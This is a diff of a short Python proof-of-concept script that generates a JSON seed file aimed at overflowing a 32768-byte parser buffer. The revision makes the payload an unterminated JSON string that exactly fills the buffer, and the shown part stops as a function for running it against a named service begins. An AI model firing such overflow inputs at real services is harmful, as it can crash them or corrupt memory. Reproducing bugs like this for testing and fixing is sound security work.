@@ -3,13 +3,18 @@ import os
 import sys
 
 def generate_poc():
-    print("[*] Generating PoC targeting buf[start_pos + parse_end] overflow...")
-    # El buffer es de 32768 bytes. Necesitamos que parse_end alcance ese límite.
-    # Una cadena JSON plana de ~32KB debería hacerlo.
-    payload = '{"key": "' + ("A" * 32760) + '"}'
+    print("[*] Generating PoC (Invalid JSON + Boundary Condition)...")
+    # THE KEY: The JSON must be INVALID (no closing quote/brace) and exactly fill the buffer.
+    # Buffer is 32768. 
+    # Prefix = '{"key":"' (8 chars).
+    prefix = '{"key":"'
+    # Fill exactly to 32768 bytes
+    padding = "A" * (32768 - len(prefix)) 
+    # The payload is just the open string. It will fail to parse at the end.
+    payload = prefix + padding
     with open("manual_seed.json", "w") as f:
         f.write(payload)
-    print(f"    Created manual_seed.json ({len(payload)} bytes)")
+    print(f"    Created manual_seed.json ({len(payload)} bytes - INVALID JSON)")
 
 def run_target(service_name):
     print(f"\n[*] Testing {service_name}...")
